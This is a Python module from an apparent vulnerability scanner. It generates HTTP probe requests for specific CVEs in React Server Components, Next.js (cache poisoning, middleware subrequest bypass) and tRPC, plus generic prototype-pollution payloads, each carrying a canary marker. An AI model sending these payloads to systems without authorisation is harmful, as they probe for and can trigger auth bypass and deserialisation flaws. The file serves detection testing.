"""Per-class CVE variant generators for cve_variant_probe."""

from __future__ import annotations

import json
from typing import Any
from urllib.parse import quote


def _rsc_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """React Server Components — CVE-2025-55182 / CVE-2025-66478.

    Different prod stacks accept different RSC chunk syntaxes. Public PoC
    typically uses ONE shape; we sweep the four known-accepted shapes plus
    Next-Action header permutations.
    """
    aid = action_id or "0000000000000000000000000000000000000000"
    variants: list[dict[str, Any]] = []

    # Shape A — bare children chunk (classic React2Shell)
    variants.append({
        "label": "rsc.children_chunk",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Content-Type": "text/plain;charset=UTF-8",
            "Accept": "text/x-component",
        },
        "body": f'0:["$","$L1",null,{{"children":"{canary}"}}]\n',
    })
    # Shape B — multipart Server Action (Next.js >= 14)
    boundary = "----PraetorRSC"
    variants.append({
        "label": "rsc.multipart_action",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Accept": "text/x-component",
        },
        "body": (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f'["{canary}"]\r\n'
            f"--{boundary}--\r\n"
        ),
    })
    # Shape C — urlencoded form-state replay
    variants.append({
        "label": "rsc.form_state_urlencoded",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-rsc-form-state": '{"__proto__":{"polluted":"' + canary + '"}}',
            "Accept": "text/x-component",
        },
        "body": f"$ACTION_REF_1={canary}",
    })
    # Shape D — RSC chunk reference with $1@ syntax (deserialisation entry)
    variants.append({
        "label": "rsc.dollar_ref",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Content-Type": "text/plain;charset=UTF-8",
            "Accept": "text/x-component",
        },
        "body": f'1:"${{"canary":"{canary}"}}"\n2:[1]\n',
    })
    # Shape E — header-only canary in Next-Url (route-unbound variant)
    variants.append({
        "label": "rsc.next_url_canary",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Next-Url": f"/{canary}",
            "Content-Type": "text/plain;charset=UTF-8",
            "Accept": "text/x-component",
        },
        "body": "0:{}\n",
    })
    # Shape F — operator-supplied baseline with header trio injected
    if baseline:
        variants.append({
            "label": "rsc.baseline_with_headers",
            "method": "POST",
            "headers": {
                "Next-Action": aid,
                "Content-Type": "text/plain;charset=UTF-8",
                "Accept": "text/x-component",
            },
            "body": baseline.replace("__CANARY__", canary),
        })
    return variants


def _nextjs_cache_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Next.js cache poisoning — x-now-route-matches family."""
    variants = []
    variants.append({
        "label": "next.x_now_route_matches",
        "method": "GET",
        "headers": {"x-now-route-matches": f"1={canary}"},
        "body": "",
    })
    variants.append({
        "label": "next.middleware_subrequest_bypass",
        "method": "GET",
        "headers": {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"},
        "body": "",
    })
    variants.append({
        "label": "next.invoke_path_collision",
        "method": "GET",
        "headers": {
            "x-invoke-path": f"/api/{canary}",
            "x-invoke-output": f"/{canary}",
        },
        "body": "",
    })
    variants.append({
        "label": "next.prerender_revalidate_canary",
        "method": "GET",
        "headers": {
            "x-prerender-revalidate": canary,
            "x-vercel-internal": "1",
        },
        "body": "",
    })
    if baseline:
        variants.append({
            "label": "next.baseline_with_canary_header",
            "method": "GET",
            "headers": {"x-now-route-matches": baseline.replace("__CANARY__", canary)},
            "body": "",
        })
    return variants


def _trpc_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """tRPC SSPP — CVE-2025-68130. Server-side prototype pollution via batch
    input rehydration."""
    variants = []
    variants.append({
        "label": "trpc.batch_proto",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": f'{{"0":{{"json":{{"__proto__":{{"polluted":"{canary}"}}}}}}}}',
    })
    variants.append({
        "label": "trpc.batch_constructor",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": f'{{"0":{{"json":{{"constructor":{{"prototype":{{"polluted":"{canary}"}}}}}}}}}}',
    })
    variants.append({
        "label": "trpc.querystring_proto",
        "method": "GET",
        "headers": {},
        "body": "",
        "query": f"batch=1&input=%7B%220%22%3A%7B%22json%22%3A%7B%22__proto__%22%3A%7B%22polluted%22%3A%22{canary}%22%7D%7D%7D%7D",
    })
    return variants


def _proto_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Prototype pollution — axios / n8n / general JS deep-merge sinks."""
    variants = []
    bodies = [
        ("proto.dunder", f'{{"__proto__":{{"polluted":"{canary}"}}}}'),
        ("proto.constructor", f'{{"constructor":{{"prototype":{{"polluted":"{canary}"}}}}}}'),
        ("proto.nested_dunder", f'{{"a":{{"__proto__":{{"polluted":"{canary}"}}}}}}'),
        ("proto.unicode_key", f'{{"\\u005f\\u005fproto\\u005f\\u005f":{{"polluted":"{canary}"}}}}'),
        ("proto.array_proto", f'{{"a":[{{"__proto__":{{"polluted":"{canary}"}}}}]}}'),
    ]
    for label, body in bodies:
        variants.append({
            "label": label,
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": body,
        })
    if baseline:
        variants.append({
            "label": "proto.baseline",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": baseline.replace("__CANARY__", canary),
        })
    return variants



# part-2 generators (re-exported so _cve_variant_gen imports all 7 from here)
from ._cve_variant_defs2 import (
    _nextjs_ws_ssrf_variants, _generic_variants, _nextjs_middleware_variants,
)
